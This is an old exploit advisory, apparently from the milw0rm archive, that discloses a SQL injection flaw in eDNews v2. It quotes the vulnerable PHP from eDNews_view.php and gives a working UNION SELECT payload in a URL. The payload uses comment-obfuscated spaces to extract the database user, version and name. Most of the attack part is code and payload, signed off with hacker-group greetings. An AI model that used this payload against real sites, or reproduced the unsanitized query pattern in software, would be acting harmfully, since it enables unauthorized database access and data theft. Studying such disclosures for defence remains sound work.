@@ -1,0 +1,31 @@
+  #######################################################################################
+  #                                                                                     #
+  #                 ...:::::eDNews v2 SQL Injection Vulnerability::::....               #          
+  #######################################################################################
+Virangar Security Team
+www.virangar.net
+--------
+Discoverd By :virangar security team(hadihadi)
+special tnx to:MR.nosrati,black.shadowes,MR.hesy,Ali007,Zahra
+& all virangar members & all hackerz
+greetz:to my best friend in the world hadi_aryaie2004
+& my lovely friend arash(imm02tal)
+-------
+vuln code in eDNews_view.php:
+line 22-23:
+if ( isset( $_REQUEST['newsid'] ) ) {
+ ${$CONFIG['fld_id']} = $_REQUEST['newsid'];
+....
+line 42-46:
+$arr_select = array( $CONFIG['fld_id'], ''.$CONFIG['fld_title'].'', ''.$CONFIG['fld_content'].'',''.$CONFIG['fld_dateCreated'].'',''.$CONFIG['fld_score'] .'');
+$arr_from = array($CONFIG['table']);
+$where = $CONFIG['fld_id'].' = '.${$CONFIG['fld_id']};
+$eDQuery_ = new edQuery( $dblink, $CONFIG['db'], $arr_from, $arr_select, $where, null, 'extended', $CONFIG['debug'], null, '1' );
+$arr_rst = $eDQuery_->getRecords();
+---
+exploit:
+http://site.com/eDNews_view.php?newsid=-99/**/union/**/select/**/1,2,concat(user(),0x3a,version(),0x3e,database()),4,5/*
+-------
+young iranian h4ck3rz
+
+# milw0rm.com [2008-12-29]
